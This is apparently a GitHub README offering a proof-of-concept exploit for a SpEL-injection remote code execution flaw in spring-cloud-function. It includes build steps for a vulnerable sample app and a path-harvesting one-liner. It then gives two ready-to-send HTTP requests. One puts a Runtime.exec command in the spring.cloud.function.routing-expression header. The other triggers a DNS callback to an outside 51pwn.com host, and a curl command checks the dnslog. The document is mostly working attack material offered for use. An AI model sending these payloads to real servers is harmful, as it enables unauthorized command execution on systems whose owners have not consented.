[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773) [![GitHub Followers](https://img.shields.io/github/followers/hktalent.svg?style=social&label=Follow)](https://github.com/hktalent/)
[![Top Langs](https://profile-counter.glitch.me/hktalent/count.svg)](https://51pwn.com)


# spring-spel-0day-poc
spring-cloud/spring-cloud-function RCE EXP POC
https://github.com/spring-cloud/spring-cloud-function
header
```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
```
# build
```bash
wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip
unzip v3.1.6.zip
cd spring-cloud-function-3.1.6
cd spring-cloud-function-samples/function-sample-pojo
mvn package
java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
```
<img width="1236" alt="image" src="https://user-images.githubusercontent.com/18223385/160410727-35bf6bae-bb32-48c1-9081-edeef1e510f1.png">

# get path lists for test

```bash
find . -name "*.java"|xargs -I % cat %|grep -Eo '"([^" \.\/=>\|,:\}\+\)'"'"']{8,})"'|sort -u|sed 's/"//g'
```
```
...
functionRouter
uppercase
lowercase
...
```

<img width="829" alt="image" src="https://user-images.githubusercontent.com/18223385/160410037-12fd9be5-d35f-4009-9333-632eb29df54c.png">

# poc1

```
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a /System/Applications/Calculator.app")
Content-Length: 5

51pwn
```

<img width="1148" alt="image" src="https://user-images.githubusercontent.com/18223385/160409293-eae65d89-9dea-43c9-8157-795f124489ad.png">

# poc2

```
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("random87535.rce.51pwn.com")
Content-Length: 5

51pwn
```

## check

```bash
curl -v -H "user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" 'https://51pwn.com/dnslog?q=random87535.rce.51pwn.com'
```

# Donation
| Wechat Pay | AliPay | Paypal | BTC Pay |BCH Pay |
| --- | --- | --- | --- | --- |
|<img src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/wc.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/zfb.png>|[paypal](https://www.paypal.me/pwned2019) **miracletalent@gmail.com**|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BTC.png>|<img width=166 src=https://raw.githubusercontent.com/hktalent/myhktools/main/md/BCH.jpg>|

<!--
https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
-->
